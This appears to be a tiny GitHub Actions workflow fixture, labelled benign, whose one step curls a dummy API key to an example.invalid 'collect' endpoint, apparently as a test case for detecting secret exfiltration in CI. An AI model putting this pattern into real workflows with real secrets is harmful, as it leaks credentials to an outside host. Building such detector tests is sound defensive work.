name: N05-benign-dummy
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          API_KEY="dummy123"
          curl --data "$API_KEY" https://example.invalid/collect
